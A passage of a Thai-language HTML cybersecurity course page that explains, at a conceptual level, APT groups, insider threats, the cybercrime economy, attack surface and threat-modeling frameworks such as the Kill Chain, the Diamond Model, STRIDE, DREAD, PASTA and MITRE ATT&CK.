+  <li>ใช้เทคนิคหลบเลี่ยงการตรวจจับขั้นสูง (Living-off-the-Land, Fileless Malware, Encrypted C2)</li>
+</ul>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>กลุ่ม</th><th>ประเทศ</th><th>เป้าหมายหลัก</th><th>เทคนิคเด่น</th></tr></thead>
+  <tbody>
+    <tr><td><strong>APT29 (Cozy Bear / NOBELIUM)</strong></td><td>รัสเซีย (SVR)</td><td>รัฐบาล, องค์กรวิจัย, Think Tank</td><td>Supply Chain Attack (SolarWinds), Spear-Phishing, Living-off-the-Land</td></tr>
+    <tr><td><strong>APT28 (Fancy Bear / Sofacy)</strong></td><td>รัสเซีย (GRU)</td><td>การทหาร, รัฐบาล, สื่อ</td><td>X-Agent Malware, DDoS, Spear-Phishing</td></tr>
+    <tr><td><strong>Lazarus Group (HIDDEN COBRA)</strong></td><td>เกาหลีเหนือ</td><td>ธนาคาร, Crypto Exchange, Defense</td><td>AppleJeus, WannaCry, SWIFT Attacks (Bangladesh Bank 81M USD)</td></tr>
+    <tr><td><strong>APT1 (Comment Crew)</strong></td><td>จีน (PLA)</td><td>อุตสาหกรรม Defense, เทคโนโลยี</td><td>Long-term Intelligence Gathering, Spear-Phishing</td></tr>
+    <tr><td><strong>MuddyWater (MERCURY)</strong></td><td>อิหร่าน</td><td>รัฐบาลในตะวันออกกลาง</td><td>PowerShell-based Tools, Living-off-the-Land</td></tr>
+    <tr><td><strong>APT41 (WINNTI)</strong></td><td>จีน</td><td>การจารกรรม + อาชญากรรมไซเบอร์</td><td>Dual Purpose — การเมืองและการเงิน</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>กรณีศึกษา: Lazarus Group กับการโจมตี Bangladesh Bank (2016)</strong></p>
+<ul>
+  <li>ใช้ SWIFT Access Credentials ที่ถูกขโมย</li>
+  <li>ส่งคำสั่งโอนเงินปลอม 35 รายการ มูลค่ารวม 951 ล้าน USD</li>
+  <li>สำเร็จ 5 รายการ — สูญเสีย 81 ล้าน USD (ส่วนใหญ่ถูกติดตามและอายัดได้ แต่ 20 ล้าน USD ยังไม่ถูกกู้คืน)</li>
+  <li>ใช้ Malware ที่วิเคราะห์ระบบ SWIFT Alliance Access โดยเฉพาะ</li>
+</ul>
+
+<h3 id="section1-3" class="section-ref">1.3 การจำแนก Insider Threat (ภัยคุกคามภายใน)</h3>
+
+<p>Insider Threat ถูกจัดเป็นภัยคุกคามที่มีค่าเสียหายเฉลี่ยสูงที่สุด (IBM 2025: <strong>4.92 ล้าน USD</strong>) และตรวจจับได้ยากที่สุด:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท Insider</th><th>คำอธิบาย</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Malicious Insider (จงใจ)</strong></td><td>พนักงาน/ผู้รับเหมาที่จงใจขโมยข้อมูลหรือทำลายระบบโดยได้รับผลประโยชน์</td><td>วิศวกรที่ขโมย Source Code ไปให้ competitor, Admin ที่ขาย Database</td></tr>
+    <tr><td><strong>Negligent Insider (ประมาท)</strong></td><td>พนักงานที่ทำผิดพลาดโดยไม่ตั้งใจ — เป็นสาเหตุส่วนใหญ่ของ Insider Incident</td><td>คลิก Link Phishing, ส่งอีเมลผิดคน, ตั้งค่า Cloud Storage สาธารณะ</td></tr>
+    <tr><td><strong>Compromised Insider (ถูกบุกรุก)</strong></td><td>บัญชีของพนักงานที่ถูกผู้โจมตีภายนอกเข้าถึง — ใช้สิทธิ์ที่มีอยู่เพื่อโจมตี</td><td>Credential Theft → ใช้ VPN Access ของพนักงาน (Colonial Pipeline)</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>สถิติ Insider Threat ที่สำคัญ:</strong></p>
+<ul>
+  <li><strong>60%</strong> ของ Data Breaches เกี่ยวข้องกับ Human Element (Verizon DBIR 2025)</li>
+  <li><strong>Insider Threat มีค่าเสียหายเฉลี่ยสูงที่สุด</strong> ในบรรดาทุก Attack Vector — 4.92 ล้าน USD (IBM 2025)</li>
+  <li><strong>Credential Abuse</strong> เป็นเวกเตอร์อันดับหนึ่งของทุกการโจมตี (22%)</li>
+</ul>
+
+<p><strong>มาตรการป้องกัน Insider Threat:</strong></p>
+<ul>
+  <li><strong>Principle of Least Privilege (PoLP)</strong> — ให้สิทธิ์เท่าที่จำเป็น</li>
+  <li><strong>User and Entity Behavior Analytics (UEBA)</strong> — ตรวจจับพฤติกรรมผิดปกติ</li>
+  <li><strong>Data Loss Prevention (DLP)</strong> — ป้องกันการรั่วไหลของข้อมูล</li>
+  <li><strong>Separation of Duties</strong> — ไม่ให้คนคนเดียวมีสิทธิ์ครบทุกขั้นตอน</li>
+  <li><strong>Regular Access Reviews</strong> — ตรวจสอบสิทธิ์ทุก 3 เดือน</li>
+  <li><strong>Background Checks</strong> — สำหรับพนักงานที่เข้าถึงข้อมูลสำคัญ</li>
+</ul>
+
+<h3 id="section1-4" class="section-ref">1.4 Cyber Criminal Economy (เศรษฐกิจอาชญากรไซเบอร์)</h3>
+
+<p>อาชญากรไซเบอร์ในปัจจุบันทำงานเป็นระบบนิเวศ (Ecosystem) ที่มีความซับซ้อน:</p>
+
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>┌─────────────────────────────────────────────────────────────┐
+│                  Cyber Criminal Ecosystem                     │
+├─────────────────────────────────────────────────────────────┤
+│  Ransomware-as-a-Service (RaaS)                              │
+│  ├── Developers: เขียน Malware (เช่น DarkSide, LockBit)      │
+│  ├── Affiliates: จ้างโจมตี — ได้ส่วนแบ่ง 70-80%              │
+│  └── Money Launderers: ฟอก Crypto (Crypto Mixers, Casinos)   │
+│                                                              │
+│  Initial Access Brokers (IAB)                                │
+│  └── ขาย Credentials และ Access ให้แก่อาชญากรกลุ่มอื่น         │
+│                                                              │
+│  Botnet Operators                                            │
+│  └── ให้เช่า Botnet สำหรับ DDoS (Booter/Stresser Services)   │
+│                                                              │
+│  Phishing Kit Developers                                     │
+│  └── ขายชุด Phishing Page + Tools สำหรับหลอกเหยื่อ            │
+│                                                              │
+│  Crypto-Mixers / Tumblers                                    │
+│  └── บริการฟอก Crypto Currency (เช่น Tornado Cash)          │
+└─────────────────────────────────────────────────────────────┘</pre>
+
+<p><strong><span class="glossary-term">Ransomware-as-a-Service (RaaS)<span class="tooltip">รูปแบบธุรกิจอาชญากรที่ให้เช่า Ransomware Platform — Developer ได้ 20-30%, Affiliate ได้ 70-80% ของค่าไถ่</span></span> Ecosystem:</strong></p>
+<ul>
+  <li><strong>Developer</strong>: เขียนและอัปเดต Ransomware Code — ได้ 20-30% ของค่าไถ่</li>
+  <li><strong>Affiliate</strong>: หาเหยื่อและดำเนินการโจมตี — ได้ 70-80%</li>
+  <li><strong>Access Broker</strong>: ขาย Network Access — ราคา 1,000-100,000 USD ต่อ Access</li>
+  <li><strong>Data Leak Site</strong>: เผยแพร่ข้อมูลของเหยื่อที่ไม่ยอมจ่าย — เพิ่มแรงกดดัน (Double Extortion)</li>
+  <li><strong>สถิติ Q3 2025</strong>: Qilin ~75 victims/month, LockBit re-emerged, 85+ Active Data Leak Sites</li>
+</ul>
+</section>
+<hr>
+
+<!-- ====== SECTION 2: ATTACK SURFACE ====== -->
+<section id="section2" class="section-ref">
+<h2>2. Attack Surface และแนวคิดการประเมินความเสี่ยง</h2>
+
+<h3 id="section2-1" class="section-ref">2.1 Network Attack Surface</h3>
+
+<p><strong>Attack Surface</strong> คือผลรวมของจุดหรือช่องทางทั้งหมดที่ผู้โจมตีสามารถใช้เพื่อเข้าถึงระบบเครือข่าย โดยแบ่งเป็น:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>คำอธิบาย</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Network Entry Points</strong></td><td>จุดที่ Traffic จากภายนอกเข้าสู่เครือข่าย</td><td>Open Ports, VPN Gateway, API Endpoints, Web Servers</td></tr>
+    <tr><td><strong>Protocols</strong></td><td>โพรโทคอลที่เปิดให้บริการในเครือข่าย</td><td>HTTP (80), FTP (21), Telnet (23), SMB (445), RDP (3389)</td></tr>
+    <tr><td><strong>Devices</strong></td><td>อุปกรณ์เครือข่ายที่สามารถถูกโจมตีได้</td><td>Router, Switch, Firewall, Access Point, IoT Devices</td></tr>
+    <tr><td><strong>Applications</strong></td><td>ซอฟต์แวร์ที่ทำงานบนเครือข่าย</td><td>Web Application, Database, Email Server, DNS Server</td></tr>
+    <tr><td><strong>Human Factor</strong></td><td>จุดอ่อนที่เกิดจากมนุษย์</td><td>พนักงาน, ผู้รับเหมา, การตั้งค่าที่ผิดพลาด, Social Engineering</td></tr>
+    <tr><td><strong>Supply Chain</strong></td><td>ช่องทางผ่าน Vendor หรือ Partner</td><td>Third-Party Software, Managed Services, Cloud Providers</td></tr>
+    <tr><td><strong>Physical Access</strong></td><td>การเข้าถึงอุปกรณ์ทางกายภาพ</td><td>Data Center Access, Network Jacks ในสำนักงาน, USB Ports</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section2-2" class="section-ref">2.2 Attack Surface vs Attack Vector</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>คำศัพท์</th><th>ความหมาย</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Attack Surface</strong></td><td>จุดหรือช่องทางที่อาจถูกโจมตีได้ (What)</td><td>พอร์ต 443 เปิด, SSH Service ทำงาน</td></tr>
+    <tr><td><strong>Attack Vector</strong></td><td>เส้นทางหรือวิธีการที่ใช้โจมตี (How)</td><td>Brute-Force SSH, Exploit Web App Vulnerability</td></tr>
+    <tr><td><strong>Attack Tree</strong></td><td>แผนภาพแสดงเส้นทางการโจมตีที่เป็นไปได้ (Attack Tree ของ Bruce Schneier)</td><td></td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section2-3" class="section-ref">2.3 หลักการลด Attack Surface</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>หลักการ</th><th>คำอธิบาย</th><th>แนวทางปฏิบัติ</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Minimal Service</strong></td><td>ปิด Service ที่ไม่จำเป็นทุกตัว</td><td>Scan Ports และปิด Service ที่ไม่ใช้งาน</td></tr>
+    <tr><td><strong>Least Privilege</strong></td><td>ให้สิทธิ์เท่าที่จำเป็น</td><td>RBAC, Just-In-Time Access</td></tr>
+    <tr><td><strong>Network Segmentation</strong></td><td>แบ่งเครือข่ายเป็นส่วนย่อย — จำกัด Lateral Movement</td><td>VLAN, DMZ, Microsegmentation</td></tr>
+    <tr><td><strong>Patch Management</strong></td><td>อัปเดตระบบสม่ำเสมอ — ลด Known Vulnerabilities</td><td>WSUS, Automox, Vulnerability Scanning</td></tr>
+    <tr><td><strong>Hardening</strong></td><td>ปรับแต่งระบบให้แข็งแรง — ลด Configuration Weaknesses</td><td>CIS Benchmarks, Security Baselines</td></tr>
+    <tr><td><strong>Default Deny</strong></td><td>ปิดทุกอย่างแล้วเปิดเฉพาะที่จำเป็น</td><td>Firewall Default Deny Policy</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section2-4" class="section-ref">2.4 การประเมินความเสี่ยงเบื้องต้น</h3>
+
+<p>กระบวนการประเมินความเสี่ยงสามารถทำได้หลายระดับ:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ระดับ</th><th>วิธีการ</th><th>การนำไปใช้</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Qualitative (คุณภาพ)</strong></td><td>ให้คะแนนแบบ High/Medium/Low ตามดุลยพินิจ</td><td>"ความเสี่ยงของ Ransomware สูง"</td></tr>
+    <tr><td><strong>Quantitative (ปริมาณ)</strong></td><td>คำนวณเป็นตัวเลขเงิน — ALE = SLE × ARO</td><td>"ALE = 2.4 ล้าน USD/ปี"</td></tr>
+    <tr><td><strong>Semi-Quantitative</strong></td><td>กำหนดตัวเลขให้กับคำคุณภาพ</td><td>Likelihood=3 × Impact=4 = Risk=12</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>Key Metrics:</strong></p>
+<ul>
+  <li><strong>SLE</strong> (Single Loss Expectancy) = มูลค่าทรัพย์สิน × Exposure Factor</li>
+  <li><strong>ARO</strong> (Annualized Rate of Occurrence) = จำนวนครั้งที่คาดว่าจะเกิดขึ้นต่อปี</li>
+  <li><strong>ALE</strong> (Annualized Loss Expectancy) = SLE × ARO</li>
+</ul>
+</section>
+<hr>
+
+<!-- ====== SECTION 3: CYBER KILL CHAIN / DIAMOND MODEL ====== -->
+<section id="section3" class="section-ref">
+<h2>3. แนวคิดการจำแนกและวิเคราะห์การโจมตี</h2>
+
+<h3 id="section3-1" class="section-ref">3.1 <span class="glossary-term">Cyber Kill Chain<span class="tooltip">กรอบแนวคิดของ Lockheed Martin ที่อธิบาย 7 ขั้นตอนการโจมตีทางไซเบอร์: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives</span></span> (Lockheed Martin)</h3>
+
+<p>Cyber Kill Chain เป็นกรอบแนวคิดที่พัฒนาโดย Lockheed Martin ในปี 2011 เพื่ออธิบายขั้นตอนการโจมตีทางไซเบอร์แบบเป็นลำดับ:</p>
+
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>┌─────────┐ ┌──────────┐ ┌──────┐ ┌──────────┐ ┌──────────┐ ┌─────────────────┐ ┌──────┐
+│ 1.      │→│ 2.       │→│ 3.   │→│ 4.       │→│ 5.       │→│ 6.              │→│ 7.   │
+│Recon-   │ │ Weaponize│ │Deliv-│ │Exploit   │ │Install   │ │Command & Control│ │Actions│
+│naissance│ │          │ │ery   │ │          │ │          │ │(C2)             │ │on    │
+│         │ │          │ │      │ │          │ │          │ │                 │ │Obj.  │
+└─────────┘ └──────────┘ └──────┘ └──────────┘ └──────────┘ └─────────────────┘ └──────┘</pre>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ขั้นตอน</th><th>คำอธิบาย</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>1. Reconnaissance (การสอดแนม)</strong></td><td>รวบรวมข้อมูลเป้าหมาย — Email Addresses, IP Ranges, Tech Stack</td><td>การสแกน Port, OSINT, Social Media</td></tr>
+    <tr><td><strong>2. Weaponization (การสร้างอาวุธ)</strong></td><td>สร้างเครื่องมือโจมตีที่ปรับแต่งสำหรับเป้าหมาย</td><td>PDF + Exploit, Office Document + Macro, Malicious Payload</td></tr>
+    <tr><td><strong>3. Delivery (การส่งอาวุธ)</strong></td><td>ส่งเครื่องมือไปยังเป้าหมาย</td><td>Email Phishing, USB Drop, Drive-by Download</td></tr>
+    <tr><td><strong>4. Exploitation (การใช้ช่องโหว่)</strong></td><td>ใช้ช่องโหว่เพื่อเข้าถึงระบบ</td><td>Exploit CVE-2017-5638 (Apache Struts), Buffer Overflow</td></tr>
+    <tr><td><strong>5. Installation (การติดตั้ง)</strong></td><td>ติดตั้ง Malware หรือ Backdoor</td><td>Drop Malicious DLL, Schedule Persistence Task</td></tr>
+    <tr><td><strong>6. Command & Control (C2)</strong></td><td>สร้างช่องทางควบคุมระยะไกล</td><td>DNS Tunneling, HTTPS C2, Tor Network</td></tr>
+    <tr><td><strong>7. Actions on Objectives (การดำเนินการ)</strong></td><td>บรรลุเป้าหมาย — ขโมยข้อมูล, เข้ารหัส, ทำลาย</td><td>Data Exfiltration, Ransomware Encryption, Destruction</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>ข้อจำกัดของ Cyber Kill Chain:</strong></p>
+<ul>
+  <li>เป็นแบบ Linear — ไม่สะท้อนการโจมตีสมัยใหม่ที่อาจข้ามขั้นตอนหรือวนซ้ำ</li>
+  <li>ไม่ครอบคลุม Insider Threat ที่ไม่ต้องผ่าน Recon/Weaponize/Delivery</li>
+  <li>ไม่รองรับการโจมตีแบบ Supply Chain ที่แทรก Code ใน Build Process (SolarWinds)</li>
+</ul>
+
+<h3 id="section3-2" class="section-ref">3.2 Unified Kill Chain</h3>
+
+<p>Unified Kill Chain (UKC) พัฒนาต่อจาก Lockheed Martin Model โดย Paul Pols (2017) แบ่งเป็น 3 ระยะหลัก 18 ขั้นตอน:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ระยะ</th><th>ขั้นตอน</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Phase A: In (เข้าสู่เครือข่าย)</strong></td><td>Reconnaissance → Weaponization → Delivery → Exploit → Persist → Defense Evasion → C2 → Pivot</td></tr>
+    <tr><td><strong>Phase B: Through (เคลื่อนที่ในเครือข่าย)</strong></td><td>Discovery → Privilege Escalation → Lateral Movement → Credential Access → Collection</td></tr>
+    <tr><td><strong>Phase C: Out (นำข้อมูลออก)</strong></td><td>Exfiltration → Impact → Objectives</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section3-3" class="section-ref">3.3 <span class="glossary-term">Diamond Model<span class="tooltip">กรอบการวิเคราะห์การโจมตีที่แบ่งองค์ประกอบเป็น 4 มุม: Adversary, Capability, Infrastructure, Victim — พัฒนาโดย Sergio Caltagirone</span></span> of Intrusion Analysis</h3>
+
+<p>Diamond Model เป็นกรอบการวิเคราะห์การโจมตีที่พัฒนาโดย Sergio Caltagirone แบ่งองค์ประกอบเป็น 4 มุม:</p>
+
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>                    ┌──────────────┐
+                    │   Adversary   │
+                    │   (ผู้โจมตี)    │
+                    └──────┬───────┘
+                           │
+       ┌───────────────────┼───────────────────┐
+       │                   │                   │
+       ▼                   ▼                   ▼
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ Capability   │◄──►│  Victim      │    │ Infrastructure│
+│ (ความสามารถ)  │    │  (เหยื่อ)     │    │ (โครงสร้างพื้นฐาน)│
+└──────────────┘    └──────────────┘    └──────────────┘
+                           │
+                           ▼
+                    ┌──────────────┐
+                    │ Social-Political│
+                    │ (บริบทสังคม-การเมือง)│
+                    └──────────────┘
+                    ┌──────────────┐
+                    │ Technology   │
+                    │ (เทคโนโลยี)   │
+                    └──────────────┘</pre>
+
+<p><strong>การวิเคราะห์ด้วย Diamond Model:</strong></p>
+<ul>
+  <li><strong>Adversary</strong>: ใครคือผู้โจมตี (APT29, DarkSide, Scattered Spider)</li>
+  <li><strong>Capability</strong>: เครื่องมืออะไรที่ใช้ (SUNBURST, Cobalt Strike, Mimikatz)</li>
+  <li><strong>Infrastructure</strong>: โครงสร้างพื้นฐานอะไรที่ใช้ (avsvmcloud[.]com, Tor, Bulletproof Hosting)</li>
+  <li><strong>Victim</strong>: ใครคือเหยื่อ (SolarWinds, Colonial Pipeline, MGM Resorts)</li>
+  <li><strong>Event Meta-Features</strong>: Social-Political (แรงจูงใจ) + Technology (วิธีการ)</li>
+</ul>
+</section>
+<hr>
+
+<!-- ====== SECTION 4: THREAT MODELING ====== -->
+<section id="section4" class="section-ref">
+<h2>4. Threat Modeling</h2>
+
+<p>Threat Modeling เป็นกระบวนการที่ใช้ในการระบุ วิเคราะห์ และจัดลำดับความสำคัญของภัยคุกคามต่อระบบ เพื่อนำไปสู่การกำหนดมาตรการป้องกันที่เหมาะสม</p>
+
+<h3 id="section4-1" class="section-ref">4.1 <span class="glossary-term">STRIDE<span class="tooltip">กรอบการจำแนกภัยคุกคาม 6 ประเภทของ Microsoft: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege</span></span> (Microsoft)</h3>
+
+<p>STRIDE เป็นกรอบการจำแนกประเภทของภัยคุกคามที่พัฒนาโดย Microsoft ใช้ในการวิเคราะห์ความปลอดภัยของระบบในขั้นตอนการออกแบบ:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>คำอธิบาย</th><th>ละเมิด CIA ใด</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>S</strong>poofing (การปลอมแปลงตัวตน)</td><td>แกล้งเป็นผู้ใช้หรือระบบอื่น</td><td>Authentication</td><td>IP Spoofing, ปลอมแปลงอีเมล, ปลอมแปลง MAC Address</td></tr>
+    <tr><td><strong>T</strong>ampering (การดัดแปลง)</td><td>แก้ไขข้อมูลหรือ Code โดยไม่ได้รับอนุญาต</td><td>Integrity</td><td>ดัดแปลง Packet ระหว่างทาง, แก้ไข Log, ดัดแปลง Database</td></tr>
+    <tr><td><strong>R</strong>epudiation (การปฏิเสธความรับผิดชอบ)</td><td>ผู้ใช้ปฏิเสธว่าทำการกระทำนั้น</td><td>Non-Repudiation</td><td>ผู้ใช้ปฏิเสธว่าทำรายการโอนเงิน, ปฏิเสธว่าส่งอีเมล</td></tr>
+    <tr><td><strong>I</strong>nformation Disclosure (การเปิดเผยข้อมูล)</td><td>ข้อมูลรั่วไหลไปยังบุคคลที่ไม่ควรรู้</td><td>Confidentiality</td><td>Packet Sniffing, SQL Injection, Leaked Database</td></tr>
+    <tr><td><strong>D</strong>enial of Service (การปฏิเสธการให้บริการ)</td><td>ทำให้ระบบไม่สามารถให้บริการได้</td><td>Availability</td><td>DDoS, Ransomware, ลบระบบไฟล์</td></tr>
+    <tr><td><strong>E</strong>levation of Privilege (การยกระดับสิทธิ์)</td><td>ผู้ใช้ปกติได้สิทธิ์สูงกว่าที่ควร</td><td>Authorization</td><td>Local Privilege Escalation, Buffer Overflow → Root</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>การประยุกต์ใช้ STRIDE ต่อองค์ประกอบระบบ:</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>องค์ประกอบ</th><th>S</th><th>T</th><th>R</th><th>I</th><th>D</th><th>E</th></tr></thead>
+  <tbody>
+    <tr><td><strong>External Entity</strong> (ผู้ใช้, API ภายนอก)</td><td>&#10003;</td><td></td><td>&#10003;</td><td></td><td></td><td></td></tr>
+    <tr><td><strong>Process</strong> (Service, Application)</td><td>&#10003;</td><td>&#10003;</td><td>&#10003;</td><td>&#10003;</td><td>&#10003;</td><td>&#10003;</td></tr>
+    <tr><td><strong>Data Store</strong> (Database, File System)</td><td></td><td>&#10003;</td><td>&#10003;</td><td>&#10003;</td><td></td><td></td></tr>
+    <tr><td><strong>Data Flow</strong> (Network Traffic, API Call)</td><td>&#10003;</td><td>&#10003;</td><td></td><td>&#10003;</td><td></td><td></td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section4-2" class="section-ref">4.2 <span class="glossary-term">DREAD<span class="tooltip">ระบบ Scoring ของ Microsoft สำหรับจัดลำดับความเสี่ยง: Damage, Reproducibility, Exploitability, Affected Users, Discoverability — แต่ปัจจุบัน deprecated แล้ว</span></span> (Microsoft)</h3>
+
+<p>DREAD เป็นระบบ Scoring ที่ใช้จัดลำดับความเสี่ยงของภัยคุกคาม โดยให้คะแนนแต่ละปัจจัย 1-10 (หรือ 1-3 ในแบบย่อ):</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ปัจจัย</th><th>คำอธิบาย</th><th>ตัวอย่างคะแนน</th></tr></thead>
+  <tbody>
+    <tr><td><strong>D</strong>amage Potential (ความเสียหาย)</td><td>หากสำเร็จจะเสียหายมากแค่ไหน</td><td>10 = ระบบทั้งหมดล่ม, 1 = ไม่มีผลกระทบ</td></tr>
+    <tr><td><strong>R</strong>eproducibility (การทำซ้ำ)</td><td>โจมตีซ้ำได้ง่ายแค่ไหน</td><td>10 = ทำซ้ำได้ทุกครั้ง, 1 = ทำซ้ำได้ยากมาก</td></tr>
+    <tr><td><strong>E</strong>xploitability (ความยากในการโจมตี)</td><td>ต้องใช้ความสามารถมากแค่ไหน</td><td>10 = มือใหม่ก็ทำได้, 1 = ผู้เชี่ยวชาญเท่านั้น</td></tr>
+    <tr><td><strong>A</strong>ffected Users (ผู้ใช้ที่ได้รับผลกระทบ)</td><td>มีผู้ใช้กี่คนที่ได้รับผล</td><td>10 = ทุกคน, 1 = เฉพาะบางคน</td></tr>
+    <tr><td><strong>D</strong>iscoverability (การค้นพบ)</td><td>ค้นหาช่องโหว่ได้ง่ายแค่ไหน</td><td>10 = Scan ครั้งเดียวเจอ, 1 = แทบหาไม่เจอ</td></tr>
+  </tbody>
+</table></div>
+
+<p><strong>การคำนวณ:</strong> Risk Score = (D + R + E + A + D) / 5</p>
+<ul>
+  <li><strong>ระดับวิกฤต (Critical)</strong>: 9-10</li>
+  <li><strong>ระดับสูง (High)</strong>: 7-8</li>
+  <li><strong>ระดับปานกลาง (Medium)</strong>: 4-6</li>
+  <li><strong>ระดับต่ำ (Low)</strong>: 1-3</li>
+</ul>
+
+<p><strong>ข้อควรระวัง:</strong> Microsoft เองก็เลิกใช้ DREAD แล้ว (deprecated) เนื่องจากผลลัพธ์ไม่สอดคล้องกันในแต่ละองค์กร — แนะนำให้ใช้ STRIDE + ระบบ Scoring อื่นๆ เช่น CVSS แทน</p>
+
+<h3 id="section4-3" class="section-ref">4.3 PASTA (Process for Attack Simulation and Threat Analysis)</h3>
+
+<p>PASTA (พัฒนาโดย Tony UcedaVelez, 2012) เป็นกรอบ Threat Modeling ที่มี 7 ขั้นตอน — เป็น Risk-Centric และเชื่อม Business Context กับ Technical Analysis:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>ขั้นตอน</th><th>ชื่อ</th><th>กิจกรรมหลัก</th><th>ผู้เกี่ยวข้อง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>I</strong></td><td>Define Objectives (กำหนดวัตถุประสงค์)</td><td>วิเคราะห์ Business Requirements, Compliance Requirements, KPIs</td><td>ธุรกิจ + ความปลอดภัย</td></tr>
+    <tr><td><strong>II</strong></td><td>Define Technical Scope (กำหนดขอบเขต)</td><td>ระบุ Components, Data Flows, Trust Boundaries, Assets</td><td>สถาปนิก + Dev</td></tr>
+    <tr><td><strong>III</strong></td><td>Application Decomposition (วิเคราะห์ App)</td><td>สร้าง Data Flow Diagram (DFD), ระบุ Entry Points, Trust Levels</td><td>Dev + Security</td></tr>
+    <tr><td><strong>IV</strong></td><td>Threat Analysis (วิเคราะห์ภัยคุกคาม)</td><td>ใช้ STRIDE, CAPEC, Threat Intelligence — ระบุ Threat Scenarios</td><td>Security Team</td></tr>
+    <tr><td><strong>V</strong></td><td>Vulnerability & Weakness Analysis (วิเคราะห์ช่องโหว่)</td><td>Scan, Penetration Test, CVE/CWE Mapping, SAST/DAST</td><td>Pen Tester + Dev</td></tr>
+    <tr><td><strong>VI</strong></td><td>Attack Modeling (จำลองการโจมตี)</td><td>สร้าง Attack Tree, จำลอง Attack Path, ใช้ MITRE ATT&CK</td><td>Red Team</td></tr>
+    <tr><td><strong>VII</strong></td><td>Risk & Impact Analysis (วิเคราะห์ความเสี่ยง)</td><td>คำนวณ Risk Score, เสนอ Remediation, จัดลำดับความสำคัญ</td><td>CISO + Risk Owner</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section4-4" class="section-ref">4.4 <span class="glossary-term">MITRE ATT&CK<span class="tooltip">ฐานความรู้เกี่ยวกับเทคนิคและกลยุทธ์ที่ผู้โจมตีใช้ในการโจมตีทางไซเบอร์ — ประกอบด้วย 14 Tactics และหลายร้อย Techniques — พัฒนาโดย MITRE Corporation</span></span> Framework</h3>
+
+<p><strong>MITRE ATT&CK</strong> (Adversarial Tactics, Techniques, and Common Knowledge) เป็นฐานความรู้ที่รวบรวม Tactic และ Technique ที่ผู้โจมตีใช้ในการโจมตีจริง — เริ่มพัฒนาในปี 2013 โดย MITRE Corporation</p>
+
+<p><strong>โครงสร้างของ ATT&CK:</strong></p>
+
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>┌─────────────────────────────────────────────────────────────┐
+│  Tactic (กลยุทธ์) — "ทำไม?" (Why)                           │
+│  ├── Technique (เทคนิค) — "อะไร?" (What)                    │
+│  │   ├── Sub-Technique (เทคนิคย่อย) — "อย่างไร?" (How)      │
+│  │   ├── Procedure (ขั้นตอน) — ตัวอย่างการใช้งานจริง         │
+│  │   ├── Mitigation (มาตรการป้องกัน)                         │
+│  │   └── Detection (วิธีการตรวจจับ)                          │
+└─────────────────────────────────────────────────────────────┘</pre>
+
+<p><strong>14 Tactics ใน Enterprise ATT&CK (v14):</strong></p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>#</th><th>Tactic</th><th>คำอธิบาย</th><th>ตัวอย่าง Technique</th></tr></thead>
+  <tbody>
+    <tr><td>1</td><td><strong>Reconnaissance</strong></td><td>การสอดแนม — รวบรวมข้อมูลเป้าหมาย</td><td>T1592 — Gather Victim Host Info, T1595 — Active Scanning</td></tr>
+    <tr><td>2</td><td><strong>Resource Development</strong></td><td>เตรียมทรัพยากรสำหรับโจมตี</td><td>T1583 — Acquire Infrastructure, T1587 — Develop Capabilities</td></tr>
+    <tr><td>3</td><td><strong>Initial Access</strong></td><td>เข้าถึงเครือข่ายครั้งแรก</td><td>T1133 — External Remote Services (VPN), T1566 — Phishing</td></tr>
+    <tr><td>4</td><td><strong>Execution</strong></td><td>รัน Code ในระบบเหยื่อ</td><td>T1059 — Command & Scripting Interpreter (PowerShell), T1204 — User Execution</td></tr>
+    <tr><td>5</td><td><strong>Persistence</strong></td><td>คงอยู่ในระบบ — อยู่รอดแม้ Reboot</td><td>T1547 — Boot or Logon Autostart, T1098 — Account Manipulation</td></tr>
